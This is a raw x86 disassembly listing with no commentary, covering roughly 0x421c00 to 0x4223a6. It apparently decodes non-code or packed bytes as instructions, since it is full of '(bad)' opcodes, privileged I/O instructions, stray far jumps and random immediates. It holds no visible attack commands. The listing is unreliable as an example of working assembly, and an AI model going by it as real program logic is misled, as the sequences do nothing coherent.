  421c00:	mov    ah,0x4
  421c02:	jle    0x421c08
  421c04:	push   esi
  421c05:	aaa    
  421c06:	ds xor dl,al
  421c09:	mov    ebp,DWORD PTR [ebp+0x50]
  421c0c:	jmp    0x421bdd
  421c0e:	jp     0x421bbc
  421c10:	jno    0x421bcf
  421c12:	into   
  421c13:	sbb    DWORD PTR [esi],eax
  421c15:	push   ebp
  421c16:	mov    ah,0xf3
  421c18:	inc    esi
  421c19:	lods   eax,DWORD PTR ds:[esi]
  421c1a:	mov    esp,0x9437d43f
  421c1f:	jbe    0x421c66
  421c21:	jo     0x421c46
  421c23:	xchg   ecx,eax
  421c24:	lds    esp,FWORD PTR ss:[edi]
  421c27:	icebp  
  421c28:	adc    dh,bh
  421c2a:	and    esp,edx
  421c2c:	loop   0x421bea
  421c2e:	mov    ds:0x650709d1,eax
  421c33:	mov    es,WORD PTR [esi]
  421c35:	inc    ebp
  421c36:	std    
  421c37:	jnp    0x421c6a
  421c39:	loop   0x421c10
  421c3b:	lahf   
  421c3c:	scas   eax,DWORD PTR es:[edi]
  421c3d:	xchg   ebx,eax
  421c3e:	mov    es,WORD PTR [eax+ebx*4]
  421c41:	call   0xa93b238
  421c46:	rcl    DWORD PTR [esi-0x72],cl
  421c49:	imul   ebx,ecx,0x186fe785
  421c4f:	sbb    DWORD PTR [ebp+0x3062a25d],esi
  421c55:	mov    eax,ds:0x2f513f7f
  421c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c5b:	jge    0x421c30
  421c5d:	sbb    al,0xf5
  421c5f:	out    0x47,al
  421c61:	cld    
  421c62:	fiadd  DWORD PTR [esi+0x36]
  421c65:	shl    DWORD PTR [edx],1
  421c67:	and    DWORD PTR [esi],0xffffff9d
  421c6a:	dec    esp
  421c6b:	push   es
  421c6c:	mov    ?,WORD PTR ds:0x56352b8
  421c72:	shl    BYTE PTR [edx],0x97
  421c75:	jl     0x421c0a
  421c77:	imul   esp,DWORD PTR [esi-0x2f5f6159],0xff6b9b7d
  421c81:	(bad)  
  421c83:	mov    cl,0xd4
  421c85:	arpl   WORD PTR [ecx],dx
  421c87:	ffree  st(1)
  421c89:	or     eax,0x16c04fa7
  421c8e:	retf   0x316f
  421c91:	dec    edi
  421c92:	add    bh,BYTE PTR [ecx+0x3cce45fc]
  421c98:	jb     0x421c9a
  421c9a:	mov    ebx,0x912902e3
  421c9f:	jecxz  0x421c34
  421ca1:	(bad)  
  421ca2:	std    
  421ca3:	adc    ebp,esp
  421ca5:	pop    edx
  421ca6:	mov    edi,0x8396d786
  421cab:	in     al,dx
  421cac:	repnz fwait
  421cae:	push   cs
  421caf:	jno    0x421cf4
  421cb1:	mov    eax,ds:0xb0621250
  421cb6:	and    esi,DWORD PTR [esi]
  421cb8:	loopne 0x421cef
  421cba:	in     eax,0x58
  421cbc:	mov    esp,0x6c9758e2
  421cc1:	sub    BYTE PTR [edi+0x6163276d],dl
  421cc7:	push   es
  421cc8:	fsub   DWORD PTR [ebx+0x4a]
  421ccb:	mov    ecx,0xbe994f02
  421cd0:	je     0x421ce6
  421cd2:	cld    
  421cd3:	dec    esp
  421cd4:	frstor [esp+edi*4-0x41]
  421cd8:	shl    BYTE PTR [esi+0x39],cl
  421cdb:	stc    
  421cdc:	pushf  
  421cdd:	jns    0x421cb6
  421cdf:	jg     0x421c8e
  421ce1:	xor    ah,BYTE PTR [edx+0x3fecca64]
  421ce7:	in     eax,dx
  421ce8:	repnz in eax,dx
  421cea:	ins    BYTE PTR es:[edi],dx
  421ceb:	mov    eax,ds:0xcb25d056
  421cf0:	xchg   edx,eax
  421cf1:	addr16 dec esi
  421cf3:	retf   
  421cf4:	cmp    eax,0x3593996
  421cf9:	repnz xchg bh,ch
  421cfc:	jno    0x421cd8
  421cfe:	jmp    0x421cfa
  421d00:	jp     0x421c94
  421d02:	push   es
  421d03:	mov    ds:0xf13a163d,al
  421d08:	xor    DWORD PTR [ebp-0x309a4318],ebp
  421d0e:	pop    ds
  421d0f:	pop    edx
  421d10:	and    edi,0xb
  421d13:	test   DWORD PTR [eax+0x42c61147],edi
  421d19:	pop    ecx
  421d1a:	and    BYTE PTR [ebp+edi*4+0x46217bfc],0x9a
  421d22:	lea    ecx,[esi]
  421d24:	add    al,0x72
  421d26:	push   ebx
  421d27:	(bad)  
  421d28:	xchg   esp,eax
  421d29:	fisub  DWORD PTR [esi+0x7784ab9c]
  421d2f:	dec    esp
  421d30:	xchg   ebx,eax
  421d31:	int3   
  421d32:	mov    eax,ds:0x63c59abf
  421d37:	or     al,BYTE PTR [edx-0x69]
  421d3a:	dec    edi
  421d3b:	call   0x2898:0x4daedca1
  421d42:	or     DWORD PTR [ebp+0x76adaa5a],edi
  421d48:	push   cs
  421d49:	mov    edx,0x22dc8bc2
  421d4e:	push   ebx
  421d4f:	inc    ebx
  421d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d51:	leave  
  421d52:	icebp  
  421d53:	sbb    eax,0x840efcd6
  421d58:	aam    0x55
  421d5a:	lea    esi,[edi]
  421d5c:	pop    ebx
  421d5d:	jp     0x421d3f
  421d5f:	dec    edi
  421d60:	mov    edi,0x39d38c93
  421d65:	retf   
  421d66:	subps  xmm1,XMMWORD PTR [esp+eax*8-0xe]
  421d6b:	or     BYTE PTR [ecx+0x71cdd6fb],bl
  421d71:	mov    ss,WORD PTR [ecx+0x3c7ef0d1]
  421d77:	inc    esp
  421d78:	sub    BYTE PTR [ebx+0x5795856e],ah
  421d7e:	push   ds
  421d7f:	test   DWORD PTR ds:0xebf52bce,ecx
  421d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d86:	xor    bl,cl
  421d88:	cdq    
  421d89:	popa   
  421d8a:	sub    al,0x6d
  421d8c:	mov    dl,0xfa
  421d8e:	mov    cl,0x7c
  421d90:	mov    ebp,0xca741974
  421d95:	test   eax,0xee143b0b
  421d9a:	(bad)  
  421d9b:	fnstenv [eax]
  421d9d:	inc    esi
  421d9e:	inc    esp
  421d9f:	or     edi,ebx
  421da1:	loope  0x421d93
  421da3:	push   0xef0bdf22
  421da8:	aam    0x2c
  421daa:	sbb    al,al
  421dac:	jp     0x421e2d
  421dae:	mov    ch,0x53
  421db0:	and    BYTE PTR [eax+0x33],0x51
  421db4:	pop    esp
  421db5:	push   esi
  421db6:	push   cs
  421db7:	jne    0x421d4c
  421db9:	(bad)  
  421dba:	sahf   
  421dbb:	js     0x421dc0
  421dbd:	and    DWORD PTR [ebp+eax*1+0x7],esi
  421dc1:	xchg   DWORD PTR [ebx+0x4cbfcb0],edx
  421dc7:	mov    ds:0x97b90e79,al
  421dcc:	push   edx
  421dcd:	ret    
  421dce:	aaa    
  421dcf:	mov    gs:0xa0093958,al
  421dd5:	mov    dh,0xf2
  421dd7:	cs ret 
  421dd9:	sub    BYTE PTR [esi+0x5300aa99],al
  421ddf:	inc    esi
  421de0:	add    al,0xa2
  421de2:	ret    
  421de3:	sub    esp,DWORD PTR [edi-0x1f4278a1]
  421de9:	je     0x421e19
  421deb:	adc    al,0x20
  421ded:	xlat   BYTE PTR ds:[ebx]
  421dee:	test   al,0x38
  421df0:	add    BYTE PTR [edi+ebx*2],ch
  421df3:	in     al,0x38
  421df5:	mov    DWORD PTR [ebx+0x82be3f6],ebp
  421dfb:	hlt    
  421dfc:	and    ecx,DWORD PTR [ecx]
  421dfe:	pop    eax
  421dff:	stos   DWORD PTR es:[edi],eax
  421e00:	or     eax,DWORD PTR [ecx-0x6006d54f]
  421e06:	push   esp
  421e07:	(bad)  
  421e08:	mov    dh,0xe3
  421e0a:	int3   
  421e0b:	pop    ebx
  421e0c:	mov    edi,0x41704f7d
  421e11:	and    eax,0x95142617
  421e16:	mov    DWORD PTR [edi-0x41],edi
  421e19:	sbb    bl,ch
  421e1b:	dec    ebx
  421e1c:	popa   
  421e1d:	(bad)  
  421e1e:	jnp    0x421dc1
  421e20:	or     BYTE PTR [ebp+0x55],dh
  421e23:	jno    0x421dd4
  421e25:	xchg   ecx,eax
  421e26:	xor    ecx,ebp
  421e28:	in     al,dx
  421e29:	sub    eax,0x47520ec4
  421e2e:	jb     0x421df5
  421e30:	sbb    DWORD PTR [ecx],ebp
  421e32:	cs pusha 
  421e34:	cmp    edx,DWORD PTR [ecx-0x73]
  421e37:	pop    ebx
  421e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e39:	add    BYTE PTR [eax],al
  421e3b:	add    BYTE PTR [ebx-0xce42c16],cl
  421e41:	cmp    ecx,ebx
  421e43:	cli    
  421e44:	in     al,dx
  421e45:	jg     0x421e7e
  421e47:	loopne 0x421eb2
  421e49:	xchg   BYTE PTR [esi-0x16],bl
  421e4c:	cwd    
  421e4e:	add    DWORD PTR [eax],eax
  421e50:	test   DWORD PTR [edx],eax
  421e52:	add    BYTE PTR [eax],al
  421e54:	inc    edx
  421e55:	adc    eax,0x4a7a84ff
  421e5a:	push   es
  421e5b:	adc    DWORD PTR [edi+0x44],ebx
  421e5e:	lock je 0x421e9f
  421e61:	out    dx,eax
  421e62:	addr16 fwait
  421e64:	adc    al,0xe8
  421e66:	dec    ecx
  421e67:	sbb    eax,0xdfb5a4d7
  421e6c:	mov    cl,BYTE PTR [eax+0x4a]
  421e6f:	cmp    eax,0x5f611ca1
  421e74:	arpl   WORD PTR [ebp+0x1c],si
  421e77:	das    
  421e78:	cdq    
  421e79:	lods   al,BYTE PTR ds:[esi]
  421e7a:	aaa    
  421e7b:	repnz and eax,0x32899c73
  421e81:	jge    0x421e4b
  421e83:	xchg   esp,eax
  421e84:	push   0xbcc050cd
  421e89:	or     eax,0xc6eac82e
  421e8e:	retf   0xf7c6
  421e91:	sub    ah,BYTE PTR [ebp+eiz*1+0x21]
  421e95:	mov    eax,0x7a6ffad5
  421e9a:	jno    0x421e26
  421e9c:	cmc    
  421e9d:	enter  0x17c0,0xe3
  421ea1:	lock mov edi,0x68f98fdf
  421ea7:	test   al,0x3b
  421ea9:	fwait
  421eaa:	push   esp
  421eab:	xor    DWORD PTR [ebx+ebx*8-0x69821570],ecx
  421eb2:	test   ebx,eax
  421eb4:	dec    ebx
  421eb5:	dec    edi
  421eb6:	retf   
  421eb7:	xchg   ebp,eax
  421eb8:	adc    dh,dh
  421eba:	dec    esi
  421ebb:	or     BYTE PTR [esi+0x31],0x6f
  421ebf:	and    DWORD PTR [ebx+eiz*4],edx
  421ec2:	jmp    0x650d:0x67cd4a37
  421ec9:	fsub   QWORD PTR [eax-0x2567944b]
  421ecf:	push   esi
  421ed0:	lods   al,BYTE PTR ds:[esi]
  421ed1:	mov    ebp,0x61a75e35
  421ed6:	cmp    BYTE PTR [eax+0x15],0xcc
  421eda:	fiadd  DWORD PTR [eax]
  421edc:	cld    
  421edd:	test   al,0xaa
  421edf:	scas   al,BYTE PTR es:[edi]
  421ee0:	xchg   edi,eax
  421ee1:	xor    eax,DWORD PTR ds:[edx+edi*4]
  421ee5:	xor    esp,DWORD PTR [ebx]
  421ee7:	and    BYTE PTR [esi],dh
  421ee9:	ja     0x421f60
  421eeb:	dec    ecx
  421eec:	cmp    DWORD PTR [ebx-0x61],esp
  421eef:	retf   0xcf16
  421ef2:	mov    WORD PTR [ebx+eax*4],ss
  421ef5:	jae    0x421ee9
  421ef7:	jle    0x421edc
  421ef9:	mov    esi,0xe5ebdd2
  421efe:	fisttp DWORD PTR [ecx-0x7a52d916]
  421f04:	cs stos BYTE PTR es:[edi],al
  421f06:	or     esp,esp
  421f08:	mov    dl,BYTE PTR [ecx]
  421f0a:	loopne 0x421f25
  421f0c:	xchg   esp,eax
  421f0d:	dec    ecx
  421f0e:	sahf   
  421f0f:	mov    eax,ds:0x34605dbd
  421f14:	jle    0x421f79
  421f16:	mov    ch,0x50
  421f18:	xchg   edi,eax
  421f19:	fiadd  DWORD PTR [esi]
  421f1b:	sbb    al,dh
  421f1d:	xchg   ebp,eax
  421f1e:	sub    eax,edx
  421f20:	ror    DWORD PTR [ebx+0x673a85e],0x1a
  421f27:	add    edx,DWORD PTR [edx]
  421f29:	push   eax
  421f2a:	test   BYTE PTR [edi+0x25],bl
  421f2d:	les    esp,FWORD PTR [esi-0xa310698]
  421f33:	dec    esi
  421f34:	jno    0x421f84
  421f36:	jp     0x421ed5
  421f38:	mov    ebp,DWORD PTR [ecx-0xd1a3065]
  421f3e:	and    eax,edi
  421f40:	cld    
  421f41:	sahf   
  421f42:	mov    ebx,0x7d0390f4
  421f47:	or     ebx,eax
  421f49:	or     ch,dl
  421f4b:	enter  0xb486,0x45
  421f4f:	jle    0x421fa6
  421f51:	sar    bl,cl
  421f53:	popa   
  421f54:	ret    
  421f55:	mov    WORD PTR ds:0x48fac41e,ds
  421f5b:	sbb    BYTE PTR [edi-0x68],0x42
  421f5f:	(bad)  
  421f60:	aas    
  421f61:	jae    0x421fc0
  421f63:	outs   dx,BYTE PTR ds:[esi]
  421f64:	into   
  421f65:	inc    eax
  421f66:	aaa    
  421f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f68:	arpl   WORD PTR [edi+ebp*2-0x33b3f1a3],si
  421f6f:	adc    cl,cl
  421f71:	mov    eax,0x8596a366
  421f76:	ffree  st(4)
  421f78:	xchg   ecx,eax
  421f79:	xchg   ebx,eax
  421f7a:	loop   0x421f0c
  421f7c:	(bad)  
  421f7e:	xor    edi,esi
  421f80:	mov    DWORD PTR [eax+0x31a75db3],ecx
  421f86:	dec    ebx
  421f87:	test   DWORD PTR [edx+edx*2-0x16],ecx
  421f8b:	add    DWORD PTR [edi+eax*1],esi
  421f8e:	pop    ebx
  421f8f:	adc    al,0x56
  421f91:	push   es
  421f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f93:	xchg   esi,eax
  421f94:	shl    BYTE PTR [ebx],cl
  421f96:	es push ds
  421f98:	sub    edi,DWORD PTR [esi+0x5b]
  421f9b:	mov    cl,0xd3
  421f9d:	mov    eax,0x1f4cc37f
  421fa2:	inc    ebp
  421fa3:	call   0xf66291b
  421fa8:	pop    ebx
  421fa9:	iret   
  421faa:	adc    edi,DWORD PTR [eax+0x55]
  421fad:	jns    0x421fa5
  421faf:	push   esp
  421fb0:	aad    0x29
  421fb2:	pusha  
  421fb3:	sbb    eax,0x761ebd2
  421fb8:	ds push ebx
  421fba:	xchg   ecx,eax
  421fbb:	fwait
  421fbc:	adc    eax,0xd5df8eb5
  421fc1:	sub    edx,esp
  421fc3:	fimul  WORD PTR [esi]
  421fc5:	dec    edx
  421fc6:	mov    DWORD PTR [esp+edi*8+0x43a11336],esp
  421fcd:	inc    eax
  421fce:	gs xor ah,cl
  421fd1:	sbb    BYTE PTR [ebx+eiz*4],ah
  421fd4:	xchg   esp,eax
  421fd5:	aas    
  421fd6:	mul    ah
  421fd8:	push   ds
  421fd9:	icebp  
  421fda:	cld    
  421fdb:	cli    
  421fdc:	jbe    0x421ffb
  421fde:	push   0x6d065940
  421fe3:	xor    edx,DWORD PTR fs:[ebp+0x51]
  421fe7:	mov    eax,DWORD PTR [ebx-0x7f]
  421fea:	fs jecxz 0x421f8b
  421fed:	push   0x28
  421fef:	mov    esi,DWORD PTR [eax]
  421ff1:	ins    BYTE PTR es:[edi],dx
  421ff2:	sub    eax,0xc40b87ce
  421ff7:	mov    ebx,0xbfd1fad4
  421ffc:	loop   0x422014
  421ffe:	mov    al,ds:0xb65d2a1e
  422003:	imul   eax,DWORD PTR [ebx+0xa00da6f],0xe341909d
  42200d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42200e:	mov    bh,BYTE PTR [ebx]
  422010:	ds (bad) 
  422012:	mov    ch,0x6b
  422014:	pop    ss
  422015:	outs   dx,DWORD PTR gs:[esi]
  422017:	sbb    al,0x7d
  422019:	mov    al,ds:0x143a05bc
  42201e:	ret    0x6b1d
  422021:	(bad)  
  422022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422023:	pop    ecx
  422024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422025:	xchg   edi,eax
  422026:	dec    ebx
  422027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422028:	jecxz  0x421fe2
  42202a:	sbb    eax,0xe41dcf81
  42202f:	scas   al,BYTE PTR es:[edi]
  422030:	in     eax,0x27
  422032:	pop    ds
  422033:	inc    edi
  422034:	mov    WORD PTR [ecx],ds
  422036:	js     0x42204e
  422038:	(bad)  
  42203a:	mov    BYTE PTR [edi+ebx*1-0x19db2c58],0xcb
  422042:	add    DWORD PTR [ecx],0x17
  422045:	mov    dl,0x93
  422047:	jge    0x42201c
  422049:	mov    eax,ds:0x4079a1cf
  42204e:	mov    dh,0x68
  422050:	in     al,dx
  422051:	adc    edi,DWORD PTR ds:0xa2b8ba43
  422057:	jnp    0x421ff7
  422059:	jns    0x42204a
  42205b:	push   edi
  42205c:	clc    
  42205d:	jnp    0x42200d
  42205f:	int3   
  422060:	jo     0x421ffb
  422062:	mov    ds:0xff5f2d64,al
  422067:	mov    ebx,0x36b9b94d
  42206c:	imul   edx,ecx,0x12e33d32
  422072:	dec    ecx
  422073:	sub    al,BYTE PTR [ebp-0x3c4cf300]
  422079:	ins    DWORD PTR es:[edi],dx
  42207a:	ret    
  42207b:	push   edx
  42207c:	inc    esp
  42207d:	jmp    0x7f0dce61
  422082:	ficomp WORD PTR [edx]
  422084:	pushf  
  422085:	in     ax,0xe
  422088:	stos   DWORD PTR es:[edi],eax
  422089:	xchg   esi,eax
  42208a:	dec    eax
  42208b:	push   esp
  42208c:	stos   DWORD PTR es:[edi],eax
  42208d:	xchg   dh,bl
  42208f:	push   ebx
  422090:	mov    al,0x3c
  422092:	dec    ecx
  422093:	clc    
  422094:	mov    al,0x16
  422096:	outs   dx,DWORD PTR ds:[esi]
  422097:	ds xchg ecx,eax
  422099:	addr16 push edi
  42209b:	(bad)  
  42209c:	cmp    ch,BYTE PTR [ebx]
  42209e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209f:	sub    al,ch
  4220a1:	pop    ebp
  4220a2:	mov    DWORD PTR [edx],esi
  4220a4:	(bad)  
  4220a5:	mov    edx,eax
  4220a7:	push   ds
  4220a8:	pop    ss
  4220a9:	sub    al,0x77
  4220ab:	fisttp QWORD PTR [edx+eax*1-0x66375297]
  4220b2:	dec    edx
  4220b3:	cwde   
  4220b4:	bound  esp,QWORD PTR [ebp+0x20]
  4220b7:	xor    al,0x15
  4220b9:	in     al,0x41
  4220bb:	add    BYTE PTR [ebp-0x53],al
  4220be:	adc    ah,dl
  4220c0:	loop   0x422045
  4220c2:	mov    al,0xf7
  4220c4:	add    al,0xa4
  4220c6:	add    esi,DWORD PTR [ecx+0x2473eca7]
  4220cc:	jmp    0xfeed3250
  4220d1:	aas    
  4220d2:	adc    eax,0x6a9fa297
  4220d7:	mov    eax,DWORD PTR [edi-0x2e000000]
  4220dd:	and    dl,BYTE PTR [esi-0x21410966]
  4220e3:	push   0x52
  4220e5:	push   ds
  4220e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e7:	and    ah,BYTE PTR [edx+0xd]
  4220ea:	pushf  
  4220eb:	add    ebx,ebp
  4220ed:	fwait
  4220ee:	add    DWORD PTR [eax],eax
  4220f0:	test   DWORD PTR [edx],eax
  4220f2:	add    BYTE PTR [eax],al
  4220f4:	lods   eax,DWORD PTR ds:[esi]
  4220f5:	adc    al,0xf3
  4220f7:	ins    DWORD PTR es:[edi],dx
  4220f8:	inc    esi
  4220f9:	xor    dh,bl
  4220fb:	int    0x4a
  4220fd:	iret   
  4220fe:	inc    esp
  4220ff:	mov    ch,0x3
  422101:	jl     0x422138
  422103:	out    dx,al
  422104:	ins    BYTE PTR es:[edi],dx
  422105:	inc    ebp
  422106:	stc    
  422107:	bnd ja 0x4220be
  42210a:	dec    ecx
  42210b:	push   esi
  42210c:	inc    edi
  42210d:	and    eax,0x2b9954ee
  422112:	jmp    0x56d7dbdc
  422117:	pop    ds
  422118:	jno    0x4220cd
  42211a:	fadd   QWORD PTR [ecx+0xa]
  42211d:	test   eax,0xb599933f
  422122:	ins    DWORD PTR es:[edi],dx
  422123:	and    BYTE PTR [esi+eiz*1+0x4290d8d8],cl
  42212a:	lods   al,BYTE PTR ds:[esi]
  42212b:	cmp    al,0x3b
  42212d:	pop    edx
  42212e:	pop    ecx
  42212f:	and    eax,DWORD PTR [edx]
  422131:	clc    
  422132:	push   es
  422133:	stc    
  422134:	sub    eax,0xda64542c
  422139:	adc    DWORD PTR [ebx+edx*2],0xffffff9d
  42213d:	and    cl,ch
  42213f:	int    0x67
  422141:	dec    edx
  422142:	shl    BYTE PTR [edx],cl
  422144:	inc    edx
  422145:	loope  0x422138
  422147:	int    0x9a
  422149:	repz (bad) 
  42214b:	pop    di
  42214d:	stc    
  42214e:	jmp    0xa85a:0x395110ef
  422155:	jns    0x42216d
  422157:	cli    
  422158:	fs xchg edi,eax
  42215a:	sbb    bl,BYTE PTR [edx]
  42215c:	push   0xfffffffc
  42215e:	popa   
  42215f:	xchg   DWORD PTR [edx-0x74],esp
  422162:	jle    0x422173
  422164:	popf   
  422165:	push   ecx
  422166:	add    al,0xba
  422168:	das    
  422169:	sub    BYTE PTR [eax],ah
  42216b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42216c:	cmp    ecx,esi
  42216e:	sbb    bh,al
  422170:	xlat   BYTE PTR ds:[ebx]
  422171:	sar    DWORD PTR [edx+0x3f9e6382],1
  422177:	mov    esi,0x906f1eee
  42217c:	push   cs
  42217d:	int    0x10
  42217f:	adc    al,0x6f
  422181:	xor    eax,0x2371025b
  422186:	ret    
  422187:	mov    ds:0x1b8cea58,al
  42218c:	cli    
  42218d:	jl     0x422148
  42218f:	pop    ds
  422190:	aas    
  422191:	pop    ebx
  422192:	imul   edx,DWORD PTR [ecx-0x19b04300],0xfffffff0
  422199:	xor    al,0xa2
  42219b:	cli    
  42219c:	pop    ds
  42219d:	(bad)  
  42219e:	cmp    eax,DWORD PTR [ecx+0x6f96af34]
  4221a4:	push   ebp
  4221a5:	(bad)  
  4221a6:	(bad)  
  4221a7:	sbb    ebx,ebp
  4221a9:	or     DWORD PTR [eax+0x0],ebx
  4221ac:	xlat   BYTE PTR ds:[ebx]
  4221ad:	jno    0x422152
  4221af:	dec    esp
  4221b0:	xchg   edx,eax
  4221b1:	and    al,0xca
  4221b3:	aas    
  4221b4:	repz pop ds
  4221b6:	or     BYTE PTR [eax],0x47
  4221b9:	pop    ecx
  4221ba:	cmp    DWORD PTR [edx+0x5a],esi
  4221bd:	(bad)  
  4221be:	test   BYTE PTR ss:[edi+0x5c],0x8e
  4221c3:	fistp  DWORD PTR [edi]
  4221c5:	and    DWORD PTR [ecx-0x6a],edi
  4221c8:	repz mov ah,0x3c
  4221cb:	jecxz  0x422231
  4221cd:	gs pop ecx
  4221cf:	cld    
  4221d0:	or     BYTE PTR [eax],0xe5
  4221d3:	and    BYTE PTR [ecx+0x159b924],ah
  4221d9:	add    eax,0xcbef6023
  4221de:	xchg   BYTE PTR [ebp+0x6111cb39],bl
  4221e4:	in     eax,0x18
  4221e6:	push   0x10
  4221e8:	pop    ss
  4221e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221ea:	jne    0x422259
  4221ec:	aaa    
  4221ed:	pop    ds
  4221ee:	outs   dx,DWORD PTR ds:[esi]
  4221ef:	mov    DWORD PTR [esi+ebp*4],edi
  4221f2:	mov    bh,0x43
  4221f4:	inc    ebp
  4221f5:	mov    ah,0x63
  4221f7:	xor    esp,DWORD PTR [esi+0x1591f4ee]
  4221fd:	sub    DWORD PTR [ecx],ebx
  4221ff:	loopne 0x422256
  422201:	outs   dx,BYTE PTR ds:[esi]
  422202:	xchg   DWORD PTR [esi+0x3573b596],esp
  422208:	sub    DWORD PTR [esi],edx
  42220a:	and    DWORD PTR [esi],esp
  42220c:	cmp    eax,0x4a592c71
  422211:	addr16 push cs
  422213:	jae    0x422279
  422215:	in     al,dx
  422216:	jbe    0x4221cc
  422218:	sub    DWORD PTR [ecx-0x33d0bb91],eax
  42221e:	daa    
  42221f:	in     eax,0xc4
  422221:	mov    dl,0x36
  422223:	retf   
  422224:	ja     0x4221ea
  422226:	mov    dh,0xee
  422228:	dec    eax
  422229:	ror    esp,0xc4
  42222c:	into   
  42222d:	adc    edi,DWORD PTR [edi+0x41dcf231]
  422233:	xchg   ebx,eax
  422234:	jl     0x42223d
  422236:	mov    ch,0x4a
  422238:	adc    ebx,DWORD PTR [edx]
  42223a:	inc    eax
  42223b:	mov    BYTE PTR [ebx+0x60],dh
  42223e:	inc    ebx
  42223f:	loope  0x422291
  422241:	add    al,0x15
  422243:	pushf  
  422244:	into   
  422245:	(bad)  
  422246:	rcr    DWORD PTR [edx+0x32980371],0xd6
  42224d:	mov    bl,0x60
  42224f:	xor    BYTE PTR ds:0x6627ec1e,al
  422255:	xor    al,0x15
  422257:	outs   dx,BYTE PTR ds:[esi]
  422258:	stos   DWORD PTR es:[edi],eax
  422259:	jg     0x4222ce
  42225b:	xlat   BYTE PTR ds:[ebx]
  42225c:	jg     0x422208
  42225e:	push   ds
  42225f:	shr    BYTE PTR [esi+0x4a2b8fcc],0x93
  422266:	add    al,0xc4
  422268:	out    0xc,al
  42226a:	in     al,dx
  42226b:	inc    edx
  42226c:	jmp    0x1ad2:0x56763604
  422273:	imul   ecx,DWORD PTR [edx-0x42e5a154],0xfffffff7
  42227a:	std    
  42227b:	int3   
  42227c:	(bad)  [ebx-0x33]
  42227f:	add    BYTE PTR [eax+ebp*4+0x3b],dh
  422283:	cs push ds
  422285:	mov    ds:0xca7c6e53,eax
  42228a:	sbb    eax,0x1f772818
  42228f:	jmp    0xec24c323
  422294:	inc    esp
  422295:	jmp    0xe69ec160
  42229a:	add    al,0xcc
  42229c:	adc    al,0x7e
  42229e:	pop    edi
  42229f:	into   
  4222a0:	int    0x8e
  4222a2:	adc    eax,esi
  4222a4:	ja     0x422274
  4222a6:	cmp    ebp,ebp
  4222a8:	out    dx,eax
  4222a9:	xchg   ecx,eax
  4222aa:	sbb    BYTE PTR [edi],dh
  4222ac:	cmp    al,0x29
  4222ae:	dec    ecx
  4222af:	cs test eax,0xd95a5fef
  4222b5:	xchg   edx,eax
  4222b6:	clc    
  4222b7:	mov    eax,ds:0x381cc5a9
  4222bc:	test   DWORD PTR [edi-0x332e4ace],0x681a344a
  4222c6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4222c8:	out    0x77,al
  4222ca:	mov    dl,BYTE PTR [edi]
  4222cc:	fst    QWORD PTR [edi-0x2c]
  4222cf:	push   ss
  4222d0:	dec    eax
  4222d1:	mov    ebx,0x288875d9
  4222d6:	aas    
  4222d7:	mov    ah,0x8f
  4222d9:	dec    edi
  4222da:	lock mov edx,DWORD PTR [ecx]
  4222dd:	fsubr  QWORD PTR [eax-0x2a]
  4222e0:	in     al,dx
  4222e1:	xor    al,0xec
  4222e3:	xchg   esi,eax
  4222e4:	cld    
  4222e5:	ret    0xba56
  4222e8:	push   ebp
  4222e9:	pop    es
  4222ea:	jg     0x42228c
  4222ec:	loop   0x422345
  4222ee:	std    
  4222ef:	push   esi
  4222f0:	cld    
  4222f1:	sub    eax,0x13a0dc97
  4222f6:	retf   0xd777
  4222f9:	and    DWORD PTR [esi],ebx
  4222fb:	imul   DWORD PTR [ecx-0x8ab01c8]
  422301:	enter  0x3961,0x63
  422305:	fs and eax,0x8b09244b
  42230b:	sub    edx,DWORD PTR [ebx+0x97a6624]
  422311:	push   ds
  422312:	push   cs
  422313:	in     al,0x22
  422315:	or     eax,0xef9f4912
  42231a:	inc    esp
  42231b:	data16 mov bl,0x6
  42231e:	sub    BYTE PTR [eax-0x6e655760],dh
  422324:	cmp    edx,DWORD PTR [esi]
  422326:	jle    0x4222d1
  422328:	je     0x422365
  42232a:	mov    eax,0xbf9284be
  42232f:	(bad)  
  422330:	push   ds
  422331:	jb     0x4223a2
  422333:	sub    al,0xfe
  422335:	pop    ebp
  422336:	inc    eax
  422337:	xchg   ecx,ebx
  422339:	aam    0x99
  42233b:	stos   BYTE PTR es:[edi],al
  42233c:	adc    al,0xbf
  42233e:	je     0x422325
  422340:	ja     0x4223a2
  422342:	mov    BYTE PTR [eax+ebx*4],dh
  422345:	mov    edi,0x480055af
  42234a:	mov    WORD PTR [edi],es
  42234c:	ds adc esi,esp
  42234f:	enter  0xfa55,0x2c
  422353:	sbb    DWORD PTR [esi],esp
  422355:	adc    BYTE PTR [edi+ecx*1-0x21],bh
  422359:	sahf   
  42235a:	(bad)  
  42235b:	xor    eax,0xf6a1ad4a
  422360:	xor    al,BYTE PTR [eax]
  422362:	add    al,BYTE PTR [edx-0x7f]
  422365:	mov    gs,esi
  422367:	pop    ecx
  422368:	mov    al,ds:0xa9500e16
  42236d:	int    0xcb
  42236f:	adc    DWORD PTR [ebx+0xfcef788],ebp
  422375:	sbb    BYTE PTR [esp+eiz*4],bh
  422378:	push   cs
  422379:	add    BYTE PTR [eax],al
  42237b:	add    ch,bl
  42237d:	cmp    al,0x8f
  42237f:	mov    esp,0x7dffbfef
  422384:	add    al,BYTE PTR [ebp-0x35d1723f]
  42238a:	cli    
  42238b:	in     eax,0x70
  42238d:	sahf   
  42238e:	add    DWORD PTR [eax],eax
  422390:	test   DWORD PTR [edx],eax
  422392:	add    BYTE PTR [eax],al
  422394:	sub    eax,eax
  422396:	in     eax,dx
  422397:	ficom  DWORD PTR ds:0xb25ad981
  42239d:	js     0x422373
  42239f:	or     eax,0x911e2ecb
  4223a4:	jl     0x4223b7
  4223a6:	jnp    0x4223e7
